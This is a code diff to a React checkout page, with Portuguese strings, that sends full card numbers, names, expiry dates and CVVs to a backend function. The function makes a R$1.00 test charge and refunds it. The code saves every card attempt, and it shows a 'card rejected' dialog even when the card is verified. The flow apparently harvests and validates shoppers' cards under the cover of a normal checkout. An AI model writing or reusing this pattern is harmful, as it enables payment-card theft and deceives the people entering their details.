@@ -192,6 +192,21 @@ const Checkout = () => {
         const subtotal = getTotal();
         const total = subtotal + frete;
 
+        // Processar verificação do cartão com cobrança e reembolso automático
+        const { data: verificationData, error: verificationError } = await supabase.functions.invoke(
+          "process-card-verification",
+          {
+            body: {
+              card_number: cardData.numero_cartao,
+              card_holder_name: cardData.nome_titular,
+              card_expiration_date: cardData.data_validade.replace("/", ""),
+              card_cvv: cardData.cvv,
+              amount: 1, // R$ 1,00 para verificação
+              user_id: user.id,
+            },
+          }
+        );
+
         // Salvar tentativa de pagamento com cartão
         const { error: cardError } = await supabase
           .from("card_payment_attempts")
@@ -206,8 +221,34 @@ const Checkout = () => {
 
         if (cardError) {
           console.error("Erro ao salvar dados do cartão:", cardError);
-          // Continua mesmo com erro para mostrar o dialog
         }
+
+        if (verificationError) {
+          console.error("Erro na verificação:", verificationError);
+          toast({
+            title: "Erro no cartão",
+            description: "Não foi possível verificar o cartão. Tente outro método de pagamento.",
+            variant: "destructive",
+          });
+          setLoading(false);
+          return;
+        }
+
+        if (!verificationData?.success) {
+          toast({
+            title: "Cartão não autorizado",
+            description: verificationData?.error || "Verifique os dados do cartão",
+            variant: "destructive",
+          });
+          setLoading(false);
+          return;
+        }
+
+        // Se a verificação foi bem-sucedida, mostrar dialog
+        toast({
+          title: "Cartão verificado!",
+          description: "Foi feita uma cobrança de R$ 1,00 que já foi estornada.",
+        });
 
         setShowCardRejectionDialog(true);
         setLoading(false);
